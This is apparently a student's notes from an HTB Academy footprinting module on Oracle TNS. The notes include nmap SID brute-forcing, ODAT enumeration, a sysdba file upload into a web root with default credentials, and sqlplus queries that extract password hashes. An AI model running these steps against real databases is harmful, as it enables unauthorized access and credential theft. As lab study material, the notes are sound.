# Oracle TNS

> *Source HTB Academy Footprinting module*

- Usually on TCP port 1521

The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.  
Initially introduced as part of the Oracle Net Services software suite, TNS supports various networking protocols between Oracle databases and client applications, such as IPX/SPX and TCP/IP protocol stacks.  
As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries.  
In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.

- Oracle 9 default password `CHANGE_ON_INSTALL`

## Nmap

- `sudo nmap -p 1521 -sV 10.129.204.235 --open`
- `sudo nmap -p 1521 -sV 10.129.204.235 --open --script oracle-sid-brute` SID bruteforcing

## ODAT

- [official repo](https://github.com/quentinhardy/odat.git)
- Install it in a python env
  - `git clone https://github.com/quentinhardy/odat.git`
  - `cd odat/`
  - `source .odatenv/bin/activate`
  - `pip install colorlog termcolor pycryptodome passlib python-libnmap`
  - `pip install cx_Oracle`
  - `pip install argcomplete`
- `./odat.py all -s 10.129.204.235`
- `./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt`file upload 
  - `curl -X GET http://10.129.204.235/testing.txt` test if the file upload worked

## SQLplus

- `sqlplus scott/tiger@10.129.204.235/XE` login (requires username and password)
- `select table_name from all_tables;` get all tables
- `select * from user_role_privs;` Database enumeration
- `select name, password from sys.user$;` Extract password hashes